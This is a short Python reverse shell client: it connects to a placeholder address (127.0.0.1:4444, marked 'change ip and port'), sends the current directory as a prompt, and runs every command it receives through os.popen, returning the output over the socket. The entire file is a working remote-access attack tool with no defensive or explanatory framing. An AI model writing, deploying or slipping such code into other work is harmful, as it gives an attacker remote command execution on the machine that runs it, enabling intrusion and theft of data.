import socket
import os

new_request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new_request.connect(('127.0.0.1', 4444))  #change ip and port
new_request.send("connection made ... \n ".encode())

while True:
    new_request.send(f"{os.getcwd()} >>> ".encode())
    cmd = new_request.recv(1024).decode()

    if 'cd' in cmd:
        try:
            os.chdir(cmd[3:].strip())
            command = os.popen(cmd).read()
            new_request.send(command.encode())
        except FileNotFoundError as e:
            new_request.send("\n Directory Not Found \n ".encode())

    command = os.popen(cmd).read()
    new_request.send(command.encode())
